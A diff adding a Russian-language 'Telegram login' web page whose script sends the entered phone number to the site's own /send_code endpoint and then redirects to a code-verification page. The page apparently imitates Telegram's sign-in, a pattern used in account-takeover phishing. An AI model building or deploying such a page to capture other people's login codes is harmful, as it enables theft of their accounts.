@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <title>Вход в Telegram</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="/static/style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Rubik:wght@400;500;600&display=swap" rel="stylesheet">
+</head>
+<body>
+  <div class="container">
+    <div class="card">
+      <img src="/static/logo.png" alt="Logo" class="logo">
+      <h2>Вход в Telegram</h2>
+      <form id="phone-form" class="form-container">
+        <input type="text" id="phone" name="phone" placeholder="+7..." required>
+        <button type="submit" id="submit-btn">Далее</button>
+      </form>
+    </div>
+  </div>
+
+  <script>
+    const form = document.getElementById('phone-form');
+    const btn = document.getElementById('submit-btn');
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      btn.innerHTML = "⏳ Отправка...";
+      btn.disabled = true;
+
+      const phone = document.getElementById('phone').value;
+
+      try {
+        const response = await fetch('/send_code', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({ phone })
+        });
+
+        const data = await response.json();
+
+        if (data.success) {
+          localStorage.setItem("phone_number", phone);
+          window.location.href = "/verify";
+        } else if (data.flood_wait) {
+          btn.innerHTML = "⛔ Попробуйте позже";
+        } else {
+          btn.innerHTML = "❌ Ошибка";
+        }
+
+      } catch (err) {
+        console.error(err);
+        btn.innerHTML = "❌ Ошибка запроса";
+      }
+
+      btn.disabled = false;
+    });
+  </script>
+</body>
+</html>
